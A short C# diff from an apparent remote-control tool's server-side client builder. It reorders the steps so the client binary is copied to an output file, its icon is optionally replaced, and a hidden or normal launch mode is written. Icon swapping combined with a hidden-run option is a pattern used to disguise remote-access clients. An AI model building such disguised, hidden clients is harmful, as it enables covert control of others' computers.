@@ -77,11 +77,6 @@ namespace RemoteControl.Server
                 byte[] fileBytes = null;
                 if (System.IO.File.Exists("RemoteControl.Client.dat"))
                 {
-                    // 修改图标
-                    if (this.checkBoxAppIcon.Checked && this.pictureBoxAppIcon.Tag != null)
-                    {
-                        IconChanger.ChangeIcon("RemoteControl.Client.dat", this.pictureBoxAppIcon.Tag as string);
-                    }
                     // 读取本地文件
                     fileBytes = System.IO.File.ReadAllBytes("RemoteControl.Client.dat");
                 }
@@ -92,6 +87,14 @@ namespace RemoteControl.Server
                     // 读取资源文件
                     //fileBytes = ResUtil.GetResFileData("RemoteControl.Client.dat"); 
                 }
+                // 拷贝文件
+                System.IO.File.WriteAllBytes(dialog.FileName, fileBytes);
+                // 修改图标
+                if (this.checkBoxAppIcon.Checked && this.pictureBoxAppIcon.Tag!=null && System.IO.File.Exists(this.pictureBoxAppIcon.Tag.ToString()))
+                {
+                    IconChanger.ChangeIcon(dialog.FileName, this.pictureBoxAppIcon.Tag as string);
+                }
+                fileBytes = System.IO.File.ReadAllBytes(dialog.FileName);
                 // 修改启动模式
                 ClientParametersManager.WriteClientStyle(fileBytes,
                     this.checkBoxHideClient.Checked ? ClientParametersManager.ClientStyle.Hidden : ClientParametersManager.ClientStyle.Normal);
